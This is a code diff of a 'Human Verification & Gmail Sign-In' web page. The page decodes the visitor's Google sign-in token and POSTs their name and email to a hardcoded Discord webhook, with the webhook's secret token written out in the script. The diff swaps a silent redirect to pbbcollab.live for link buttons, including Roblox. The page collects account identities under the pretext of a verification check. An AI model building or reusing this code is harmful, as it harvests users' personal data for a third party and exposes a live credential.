@@ -199,6 +199,47 @@
       font-weight: 600;
     }
 
+    .action-links-box {
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 14px;
+    }
+
+    .action-links-box.visible {
+      display: flex;
+    }
+
+    .link-btn {
+      display: block;
+      width: 100%;
+      padding: 11px 14px;
+      font-size: 13.5px;
+      font-weight: 600;
+      text-align: center;
+      text-decoration: none;
+      color: #09090b;
+      background-color: #ffffff;
+      border: 1px solid #ffffff;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .link-btn:hover {
+      background-color: #e4e4e7;
+      border-color: #e4e4e7;
+    }
+
+    .link-btn.secondary {
+      color: #ffffff;
+      background-color: #18181b;
+      border: 1px solid #3f3f46;
+    }
+
+    .link-btn.secondary:hover {
+      background-color: #27272a;
+    }
+
     .side-account-panel {
       display: none;
       width: 100%;
@@ -278,7 +319,7 @@
 <body>
   <div class="page-shell">
     <h1 class="page-title">Human Verification & Gmail Sign-In</h1>
-    <p class="page-subtitle">Complete human check and slide Gmail logo to sign in automatically</p>
+    <p class="page-subtitle">Complete human check and slide Gmail logo to sign in</p>
 
     <div class="layout-grid">
       <main class="normal-card">
@@ -335,6 +376,37 @@
         </div>
 
         <div id="status-msg" class="status-msg">Complete human check and slide Gmail logo to sign in.</div>
+
+        <div id="action-links-box" class="action-links-box">
+          <a
+            id="pbb-link-btn"
+            class="link-btn"
+            href="https://www.pbbcollab.live/"
+            target="_blank"
+            rel="noopener noreferrer"
+          >Open PBB</a>
+          <a
+            id="flow-link-btn"
+            class="link-btn secondary"
+            href="https://flow.google.com/"
+            target="_blank"
+            rel="noopener noreferrer"
+          >Open Google Flow</a>
+          <a
+            id="fish-link-btn"
+            class="link-btn secondary"
+            href="https://fish.audio/"
+            target="_blank"
+            rel="noopener noreferrer"
+          >Open Fish Audio</a>
+          <a
+            id="roblox-link-btn"
+            class="link-btn secondary"
+            href="https://www.roblox.com/"
+            target="_blank"
+            rel="noopener noreferrer"
+          >Open Roblox</a>
+        </div>
       </main>
 
       <aside id="side-account-panel" class="side-account-panel" aria-live="polite">
@@ -357,7 +429,6 @@
 
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1572991657060864111/aI26JcjNw1OGkASLlVwoSGOVZefGWn9Gmd6lMbcN-VjU3kUEsNOPICYIShwYJjAOy18P";
-    const TARGET_REDIRECT_URL = "https://www.pbbcollab.live/";
 
     (function initDragGmail() {
       const track = document.getElementById("drag-track");
@@ -430,6 +501,7 @@
     })();
 
     const statusMsg = document.getElementById("status-msg");
+    const actionLinksBox = document.getElementById("action-links-box");
     const sideAccountPanel = document.getElementById("side-account-panel");
     const avatarInitial = document.getElementById("avatar-initial");
     const avatarImg = document.getElementById("avatar-img");
@@ -439,7 +511,7 @@
     let humanOk = false;
     let gmailName = "";
     let gmailEmail = "";
-    let autoProceedStarted = false;
+    let webhookSent = false;
 
     function parseJwtPayload(token) {
       const base64Url = token.split(".")[1];
@@ -471,35 +543,55 @@
         ]
       };
 
-      await fetch(DISCORD_WEBHOOK_URL, {
+      const res = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-        keepalive: true
-      }).catch(() => {});
+        body: JSON.stringify(payload)
+      });
+
+      if (!res.ok) {
+        throw new Error("Webhook failed");
+      }
     }
 
-    async function checkAndAutoOpen() {
-      if (!humanOk || !gmailEmail || autoProceedStarted) return;
-      autoProceedStarted = true;
+    async function showVerifiedButtons() {
+      if (!humanOk || !gmailEmail) return;
 
-      statusMsg.textContent = "Verified and signed in. Opening pbbcollab.live...";
-      statusMsg.className = "status-msg success";
+      actionLinksBox.classList.add("visible");
 
-      await sendToDiscordWebhook();
-      window.location.href = TARGET_REDIRECT_URL;
+      if (!webhookSent) {
+        webhookSent = true;
+        statusMsg.textContent = "Verified and signed in. Sending to Discord webhook...";
+        statusMsg.className = "status-msg";
+
+        try {
+          await sendToDiscordWebhook();
+          statusMsg.textContent = "Verified, signed in, and sent to Discord. Choose a link below.";
+          statusMsg.className = "status-msg success";
+        } catch (err) {
+          webhookSent = false;
+          statusMsg.textContent = "Verified and signed in, but Discord webhook failed.";
+          statusMsg.className = "status-msg error";
+        }
+      } else {
+        statusMsg.textContent = "Verified and signed in. Choose a link below.";
+        statusMsg.className = "status-msg success";
+      }
     }
 
     function updateReadyState() {
       if (humanOk && gmailEmail) {
-        checkAndAutoOpen();
+        showVerifiedButtons();
       } else if (humanOk && !gmailEmail) {
+        actionLinksBox.classList.remove("visible");
         statusMsg.textContent = "Human check passed. Drag the Gmail logo to sign in.";
         statusMsg.className = "status-msg";
       } else if (!humanOk && gmailEmail) {
+        actionLinksBox.classList.remove("visible");
         statusMsg.textContent = "Gmail signed in. Complete human verification.";
         statusMsg.className = "status-msg";
       } else {
+        actionLinksBox.classList.remove("visible");
         statusMsg.textContent = "Complete human check and slide Gmail logo to sign in.";
         statusMsg.className = "status-msg";
       }
@@ -517,6 +609,7 @@
 
     function onHumanError() {
       humanOk = false;
+      actionLinksBox.classList.remove("visible");
       statusMsg.textContent = "Human verification failed. Check domain and connection.";
       statusMsg.className = "status-msg error";
     }
@@ -544,6 +637,7 @@
       } catch (e) {
         gmailName = "";
         gmailEmail = "";
+        actionLinksBox.classList.remove("visible");
         sideAccountPanel.classList.remove("visible");
         statusMsg.textContent = "Unable to read Gmail account info.";
         statusMsg.className = "status-msg error";
